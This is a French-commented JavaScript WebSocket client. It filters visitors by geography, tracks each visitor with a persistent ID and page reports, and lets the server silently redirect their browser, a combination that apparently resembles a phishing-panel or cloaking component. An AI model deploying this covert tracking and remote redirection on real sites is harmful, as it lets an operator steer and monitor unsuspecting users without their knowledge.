/**
 * Client WebSocket avec Filtrage Géographique
 * 
 * Ce client WebSocket intègre la vérification géographique côté serveur.
 * Il ne fait pas de redirection côté client mais laisse le serveur gérer l'accès.
 * 
 * UTILISATION: Remplace le client WebSocket standard
 */

(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        serverUrl: window.location.origin,
        reconnectAttempts: 50,
        reconnectDelay: 2000,
        heartbeatInterval: 30000,
        silentMode: true,
        autoStart: true,
        geoCheckEnabled: true
    };
    
    class GeoWebSocketClient {
        constructor() {
            this.socket = null;
            this.clientId = null;
            this.isConnected = false;
            this.reconnectCount = 0;
            this.heartbeatTimer = null;
            this.isInitialized = false;
            this.geoInfo = null;
            this.accessBlocked = false;
            
            // Démarrage automatique
            if (CONFIG.autoStart) {
                this.init();
            }
        }
        
        init() {
            if (this.isInitialized) return;
            this.isInitialized = true;
            
            // Récupérer l'ID client persistant
            this.clientId = localStorage.getItem('ws_client_id');
            
            // Vérifier d'abord l'accès géographique si activé
            if (CONFIG.geoCheckEnabled) {
                this.checkGeographicAccess().then(() => {
                    if (!this.accessBlocked) {
                        this.connect();
                        this.setupPageEvents();
                    }
                });
            } else {
                this.connect();
                this.setupPageEvents();
            }
        }
        
        async checkGeographicAccess() {
            try {
                // Envoyer une requête de vérification géographique au serveur
                const response = await fetch('/api/geo-check', {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                
                if (response.status === 403) {
                    // Accès bloqué par le serveur
                    this.accessBlocked = true;
                    this.handleAccessBlocked();
                    return;
                }
                
                if (response.ok) {
                    const data = await response.json();
                    this.geoInfo = data.geo_info;
                    
                    if (!data.allowed) {
                        this.accessBlocked = true;
                        this.handleAccessBlocked();
                        return;
                    }
                }
                
            } catch (error) {
                // En cas d'erreur, continuer (le serveur gérera)
                if (!CONFIG.silentMode) {
                    console.warn('Erreur lors de la vérification géographique:', error);
                }
            }
        }
        
        handleAccessBlocked() {
            // L'accès est bloqué, ne pas initialiser le WebSocket
            if (!CONFIG.silentMode) {
                console.log('Accès bloqué par le filtre géographique');
            }
            
            // Optionnel: afficher un message discret
            this.showAccessBlockedIndicator();
        }
        
        showAccessBlockedIndicator() {
            // Créer un indicateur discret que l'accès est restreint
            const indicator = document.createElement('div');
            indicator.id = 'geo-access-indicator';
            indicator.style.cssText = `
                position: fixed;
                bottom: 10px;
                right: 10px;
                width: 8px;
                height: 8px;
                background: #e74c3c;
                border-radius: 50%;
                z-index: 9999;
                opacity: 0.7;
            `;
            document.body.appendChild(indicator);
        }
        
        connect() {
            if (this.accessBlocked) return;
            
            try {
                // Charger Socket.IO dynamiquement si pas déjà chargé
                if (typeof io === 'undefined') {
                    this.loadSocketIO(() => this.establishConnection());
                } else {
                    this.establishConnection();
                }
            } catch (error) {
                this.scheduleReconnect();
            }
        }
        
        loadSocketIO(callback) {
            if (document.querySelector('script[src*="socket.io"]')) {
                callback();
                return;
            }
            
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js';
            script.onload = callback;
            script.onerror = () => this.scheduleReconnect();
            document.head.appendChild(script);
        }
        
        establishConnection() {
            if (this.accessBlocked) return;
            
            try {
                this.socket = io(CONFIG.serverUrl, {
                    transports: ['websocket', 'polling'],
                    timeout: 10000,
                    reconnection: false,
                    forceNew: true
                });
                
                this.setupSocketEvents();
            } catch (error) {
                this.scheduleReconnect();
            }
        }
        
        setupSocketEvents() {
            if (!this.socket || this.accessBlocked) return;
            
            // Connexion établie
            this.socket.on('connect', () => {
                this.isConnected = true;
                this.reconnectCount = 0;
                
                // Envoyer les informations géographiques si disponibles
                const connectionData = {
                    client_id: this.clientId,
                    geo_info: this.geoInfo,
                    user_agent: navigator.userAgent,
                    page_url: window.location.href
                };
                
                if (this.clientId) {
                    this.socket.emit('rejoin_client', connectionData);
                } else {
                    this.socket.emit('new_client', connectionData);
                }
                
                this.startHeartbeat();
                this.notifyPageChange();
                this.showConnectionIndicator(true);
            });
            
            // Réception de l'ID client
            this.socket.on('client_id', (data) => {
                this.clientId = data.client_id;
                localStorage.setItem('ws_client_id', this.clientId);
                this.notifyPageChange();
            });
            
            // REDIRECTION SILENCIEUSE - Fonctionnalité principale
            this.socket.on('redirect', (data) => {
                this.performSilentRedirect(data.url);
            });
            
            // Notification de blocage géographique
            this.socket.on('geo_blocked', (data) => {
                this.accessBlocked = true;
                this.handleAccessBlocked();
                if (this.socket) {
                    this.socket.disconnect();
                }
            });
            
            // Heartbeat
            this.socket.on('heartbeat_ack', () => {
                // Heartbeat reçu
            });
            
            // Déconnexion
            this.socket.on('disconnect', () => {
                this.isConnected = false;
                this.stopHeartbeat();
                this.showConnectionIndicator(false);
                if (!this.accessBlocked) {
                    this.scheduleReconnect();
                }
            });
            
            // Erreurs
            this.socket.on('connect_error', () => {
                if (!this.accessBlocked) {
                    this.scheduleReconnect();
                }
            });
            
            this.socket.on('error', () => {
                // Ignorer les erreurs en mode silencieux
            });
        }
        
        performSilentRedirect(url) {
            try {
                // Redirection immédiate et silencieuse
                window.location.href = url;
            } catch (error) {
                // Fallback
                try {
                    window.location.replace(url);
                } catch (e) {
                    // Dernier recours
                    document.location = url;
                }
            }
        }
        
        notifyPageChange() {
            if (!this.isConnected || !this.clientId || !this.socket || this.accessBlocked) return;
            
            const currentPage = this.getCurrentPageInfo();
            this.socket.emit('page_change', {
                client_id: this.clientId,
                page: currentPage,
                geo_info: this.geoInfo
            });
        }
        
        getCurrentPageInfo() {
            const path = window.location.pathname;
            const title = document.title || 'Page sans titre';
            return `${title} (${path})`;
        }
        
        startHeartbeat() {
            this.stopHeartbeat();
            
            this.heartbeatTimer = setInterval(() => {
                if (this.isConnected && this.clientId && this.socket && !this.accessBlocked) {
                    this.socket.emit('heartbeat', { 
                        client_id: this.clientId,
                        geo_info: this.geoInfo 
                    });
                }
            }, CONFIG.heartbeatInterval);
        }
        
        stopHeartbeat() {
            if (this.heartbeatTimer) {
                clearInterval(this.heartbeatTimer);
                this.heartbeatTimer = null;
            }
        }
        
        scheduleReconnect() {
            if (this.accessBlocked || this.reconnectCount >= CONFIG.reconnectAttempts) {
                return;
            }
            
            this.reconnectCount++;
            
            setTimeout(() => {
                if (!this.accessBlocked) {
                    this.connect();
                }
            }, CONFIG.reconnectDelay);
        }
        
        showConnectionIndicator(connected) {
            let indicator = document.getElementById('ws-connection-indicator');
            
            if (!indicator) {
                indicator = document.createElement('div');
                indicator.id = 'ws-connection-indicator';
                indicator.style.cssText = `
                    position: fixed;
                    bottom: 20px;
                    right: 20px;
                    width: 12px;
                    height: 12px;
                    border-radius: 50%;
                    z-index: 9999;
                    transition: all 0.3s ease;
                `;
                document.body.appendChild(indicator);
            }
            
            if (connected) {
                indicator.style.background = '#27ae60';
                indicator.style.animation = 'pulse 2s infinite';
            } else {
                indicator.style.background = '#e74c3c';
                indicator.style.animation = 'none';
            }
        }
        
        setupPageEvents() {
            if (this.accessBlocked) return;
            
            // Notifier les changements de page
            window.addEventListener('popstate', () => {
                setTimeout(() => this.notifyPageChange(), 100);
            });
            
            // Gérer la fermeture de la page
            window.addEventListener('beforeunload', () => {
                if (this.socket && this.isConnected) {
                    this.socket.disconnect();
                }
            });
            
            // Gérer la visibilité de la page
            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'visible' && !this.isConnected && !this.accessBlocked) {
                    this.connect();
                }
            });
            
            // Notifier après le chargement complet
            window.addEventListener('load', () => {
                setTimeout(() => this.notifyPageChange(), 500);
            });
        }
        
        // Méthodes publiques
        getStatus() {
            return {
                connected: this.isConnected,
                clientId: this.clientId,
                reconnectCount: this.reconnectCount,
                accessBlocked: this.accessBlocked,
                geoInfo: this.geoInfo
            };
        }
        
        forceReconnect() {
            if (!this.accessBlocked) {
                this.reconnectCount = 0;
                this.connect();
            }
        }
    }
    
    // Ajouter les styles CSS pour l'animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(1.1); }
            100% { opacity: 1; transform: scale(1); }
        }
    `;
    document.head.appendChild(style);
    
    // Auto-initialisation
    let clientInstance = null;
    
    function initClient() {
        if (clientInstance) return;
        
        try {
            clientInstance = new GeoWebSocketClient();
            
            // Exposer globalement pour le débogage (optionnel)
            if (!CONFIG.silentMode) {
                window.wsGeoClient = clientInstance;
            }
        } catch (error) {
            // Réessayer en cas d'erreur
            setTimeout(initClient, 5000);
        }
    }
    
    // Démarrer dès que possible
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initClient);
    } else {
        initClient();
    }
    
    // Démarrer aussi au chargement complet
    window.addEventListener('load', () => {
        if (!clientInstance) {
            initClient();
        }
    });
    
})();

